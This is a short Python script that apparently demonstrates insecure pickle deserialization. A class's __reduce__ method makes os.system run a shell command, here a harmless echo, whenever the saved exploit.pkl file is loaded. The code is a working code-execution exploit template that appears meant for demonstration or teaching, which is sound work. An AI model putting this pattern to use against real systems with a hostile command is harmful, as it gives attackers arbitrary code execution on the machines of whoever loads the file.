import pickle
import os

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo "You have been hacked!"',))

def serialize_exploit():
    data = pickle.dumps(EvilPickle())
    with open('exploit.pkl', 'wb') as f:
        f.write(data)

def deserialize_exploit():
    with open('exploit.pkl', 'rb') as f:
        pickle.load(f)

serialize_exploit()
deserialize_exploit()
